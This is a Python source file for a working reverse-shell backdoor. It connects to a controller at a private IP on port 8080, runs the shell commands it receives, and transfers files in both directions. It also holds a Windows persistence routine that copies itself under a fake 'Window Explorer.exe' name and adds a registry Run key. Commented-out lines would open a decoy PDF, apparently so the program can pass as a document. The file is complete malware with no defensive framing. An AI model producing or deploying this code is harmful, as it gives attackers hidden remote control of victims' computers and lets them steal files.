#!/usr/bin/env python

import socket
import subprocess
import json
import os
import sys
import shutil
import base64

class Backdoor():

    def __init__(self):
        # self.become_persistance()
        self.con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.con.connect(("192.168.5.177" , 8080))

    def become_persistance(self):
        file_location = os.environ["appdata"] + "\\Window Explorer.exe"
        if not os.path.exists(file_location):
            shutil.copyfile(sys.executable, file_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Windows_Explorer /t REG_SZ /d "' + file_location+ '"', shell=True)

    def complete_send(self, data):
        json_file = json.dumps(data)
        try:
            self.con.send(json_file.encode())
        except:
            self.con.send(json_file.encode("ISO-8859-1"))

    def file_send(self,content):
        self.con.sendall(content + b"<END>")

    def file_get(self,name):
        content = b""
        while True:
            print("new loop")
            if content[-5:] == b"<END>":
                break
            content += self.con.recv(2048)
            print("got data")
            if content[-5:] == b"<END>":
                break
        print("time to write")
        with open (name,"wb") as file:
            file.write(content.removesuffix(b"<END>"))
        return ("\n[+] Upload complete\n")

    def complete_receive(self):
        json_file = ""
        while True:
            try:
                json_file = json_file + self.con.recv(8192).decode()
                return json.loads(json_file)
            except ValueError:
                continue

    def change_dir(self,path):
        os.chdir(path)
        return ("[+] Going to " + path + "\n")

    def exucute_get(self,receiver):
        if receiver[0] == "cd" and len(receiver) > 1:
            return self.change_dir(receiver[1])
        elif receiver[0] == "download":
            return self.read_file(receiver[1])
        elif receiver[0] == "upload":
            return ""
        return subprocess.check_output(receiver,shell=True, stdin= subprocess.DEVNULL, stderr= subprocess.DEVNULL).decode("ISO-8859-1")

    def send_moded(self,msg):
        self.complete_send(str(msg))

    def read_file(self,path):
        with open(path, "rb") as file:
            return file.read()

    def run(self):
        while True:
                receiver = (self.complete_receive())
                if receiver[0] != "exit":
                    try:
                        answer = self.exucute_get(receiver)
                        if receiver[0] == "download":
                            self.complete_send(os.path.getsize(receiver[1]))
                            self.file_send(answer)
                        elif receiver[0] == "upload":
                            answer = self.file_get(receiver[1])
                            self.complete_send(answer)
                        else:
                            self.send_moded(answer)
                    except subprocess.CalledProcessError:
                        self.send_moded("[-] Wrong command\n")
                        pass
                else: 
                    break
        self.complete_send(("\nGoodBye\n"))
        self.con.close()

# file_name = sys._MEIPASS + "\Volodymyr-Manzhula.pdf"
# subprocess.Popen(file_name , shell= True)
new_backdoor = Backdoor()
new_backdoor.run()